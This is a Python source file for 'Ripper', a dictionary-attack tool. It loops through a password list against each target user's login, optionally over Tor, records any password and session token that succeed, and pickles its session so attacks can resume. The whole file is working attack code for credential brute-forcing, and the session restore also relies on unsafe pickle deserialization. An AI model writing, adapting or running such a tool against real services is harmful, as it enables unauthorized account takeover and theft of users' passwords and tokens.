from resources.Configuration import Configuration, text_to_list
from ripper.SocketLayer import SocketLayer
from datetime import datetime
import pickle
import json
import sys


TIME_FORMAT = datetime.now().strftime("%Y%m%d-%H%M%S")
RESULTS_FILE = "results-{}.json".format(TIME_FORMAT)
SESSION_FILE = "ripper-{}.session".format(TIME_FORMAT)


class Ripper:
    def __init__(self, target=None, targets=None, dictionary=None, use_tor=False, session=None):
        if session is None:
            if target is None and targets is None:
                raise Exception("Error: target must be specified.")
            elif targets is None:
                t = [target]    # Config file works with lists
            elif target is None:
                t = text_to_list(targets)
            if dictionary is None:
                self.configuration = Configuration(targets=t, use_tor=use_tor)
            else:
                self.configuration = Configuration(targets=t, use_tor=use_tor, dictionary=dictionary)
        else:
            session_file = open(session, 'rb')
            self.configuration = pickle.load(session_file)  # Load serialized configuration
            session_file.close()
        self.socket = SocketLayer(self.configuration)

    def execute(self):
        print(self.configuration)
        try:
            while self.configuration.targets:
                result = {'user': self.configuration.targets[0], 'password': '', 'token': ''}
                for password in self.configuration.dictionary:
                    # Print state of execution
                    sys.stdout.write("Ripping... User: {}, Checking password: {}\t\r"
                                     .format(self.configuration.targets[0], password))
                    sys.stdout.flush()  # Flush buffer
                    response = self.socket.try_login(self.configuration.targets[0], password)
                    if 'token' in response:
                        print("Found password for user {}: {}\n".format(self.configuration.targets[0], password))
                        result['password'] = password
                        result['token'] = response['token']
                        break
                self.configuration.targets.pop(0)
                self.configuration.next_target(result)
            print("\nFINISHED. All users tested. Saving results to file {}...".format(RESULTS_FILE), end="")
            self.save_results(RESULTS_FILE)
            self.socket.close_session()
            print(" DONE")
        except KeyboardInterrupt:
            print("Aborted: Saving sesion to {} and results to {}...".format(SESSION_FILE, RESULTS_FILE), end="")
            self.save_session()
            print(" DONE")
            self.socket.close_session()
            exit()

    def save_session(self):
        """ Saves config session to file and exits, including pending targets and attacked ones.
        :return:
        """
        session_file = open(SESSION_FILE, 'wb')
        pickle.dump(self.configuration, session_file)
        self.save_results(RESULTS_FILE)

    def save_results(self, filepath):
        with open(filepath, 'w') as f:
            json.dump(self.configuration.checked_targets, f, indent=4)
